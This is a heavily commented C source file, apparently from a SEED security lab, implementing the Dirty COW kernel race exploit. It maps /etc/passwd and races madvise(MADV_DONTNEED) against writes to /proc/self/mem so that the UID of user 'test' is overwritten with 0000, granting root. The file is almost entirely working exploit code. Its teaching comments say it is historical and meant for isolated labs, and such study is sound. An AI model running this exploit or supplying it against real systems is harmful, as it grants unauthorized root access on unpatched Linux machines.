/*
 * This program assumes that the system has a user named "test"
 * with UID 1001.
 *
 * The program searches for "test:x:1001" in /etc/passwd and uses
 * that location as the target of the write operation.
 *
 * This program was tested on the Ubuntu 12 SEED VM.
 *
 * NOTE: This is a historical Dirty COW demonstration. It is intended
 * for use only in an isolated lab environment. Modern patched
 * Linux kernels are not expected to be vulnerable to Dirty COW.
 */

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main()
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    /*
     * Open the target file in read-only mode.
     *
     * The process does not have permission to modify /etc/passwd
     * through the normal file interface.
     */
    int f = open("/etc/passwd", O_RDONLY);

    /*
     * Map the file into the process's address space using
     * MAP_PRIVATE (copy-on-write).
     *
     * PROT_READ means the mapping itself is read-only.
     */
    fstat(f, &st);
    file_size = st.st_size;

    map = mmap(NULL, file_size,
               PROT_READ,
               MAP_PRIVATE,
               f, 0);

    /*
     * The experiment requires two threads operating concurrently
     * on the same memory mapping:
     *
     *   Thread 1: repeatedly discards the mapping with MADV_DONTNEED.
     *   Thread 2: repeatedly attempts to write to the mapped address.
     */
    pthread_create(&pth1, NULL,
                   madviseThread,
                   (void *)(intptr_t)file_size);

    pthread_create(&pth2, NULL,
                   writeThread, NULL);

    /*
     * Wait for the threads to finish.
     * (In this experiment, both threads run forever.)
     */
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}

void *writeThread(void *arg)
{
    (void)arg; // The (void)arg; tells the compiler: “I intentionally don't use this parameter.” So the warning of "unused parameter" will disappear.

    /*
     * Find the location of the target string inside the mapped file.
     *
     * strstr() returns an address inside the memory mapping, so
     * target_addr is a virtual address in this process.
     */
    char *target_addr = strstr(map, "test:x:1001");

    /*
     * String used in the experiment to replace the original text.
     */
    char *content = "test:x:0000";

    /*
     * Open /proc/self/mem. This file provides access to the
     * calling process's virtual memory.
     */
    int f = open("/proc/self/mem", O_RDWR);
    if (f < 0)
        return NULL;

    /*
     * IMPORTANT EXPERIMENTAL OBSERVATION:
     *
     * In our experiment, the write has to be performed through
     * /proc/self/mem using:
     *
     *     lseek() + write()
     *
     * rather than using a normal user-space assignment such as:
     *
     *     target_addr[0] = ...;
     *
     * or:
     *
     *     map[offset] = ...;
     *
     * A direct assignment is an ordinary CPU store through the
     * MAP_PRIVATE mapping. The normal COW mechanism handles that
     * write and keeps the original file unchanged.
     *
     * The historical Dirty COW vulnerability involved a race in
     * the kernel's handling of the /proc/self/mem write path
     * together with MADV_DONTNEED. Therefore, this experiment
     * specifically uses lseek()/write() on /proc/self/mem.
     *
     * The following loop repeatedly attempts to replace
     * "test:x:1001" with "test:x:0000".
     */
    while (1) {

        /*
         * Position /proc/self/mem at the virtual address of the
         * target string.
         *
         * target_addr is a virtual address in this process,
         * not a file offset.
         */
        lseek(f, (off_t)target_addr, SEEK_SET);

        /*
         * Ask the kernel to write the replacement string to the
         * process's virtual memory at target_addr.
         */
        write(f, content, strlen(content));
    }

    /*
     * Unreachable because the loop above never terminates.
     */
    close(f);
    return NULL;
}

void *madviseThread(void *arg)
{
    /*
     * Convert the pointer-sized integer argument back to an integer.
     * file_size tells madvise() how much of the mapping to affect.
     */
    intptr_t file_size = (intptr_t)arg;

    /*
     * Continuously tell the kernel that the mapped pages are not
     * needed.
     *
     * MADV_DONTNEED causes the kernel to discard pages that can
     * be discarded and allows them to be re-established from the
     * file when accessed again.
     *
     * The Dirty COW experiment relies on this operation racing
     * with the /proc/self/mem write operation.
     */
    while (1) {
        madvise(map, file_size, MADV_DONTNEED);
    }
}
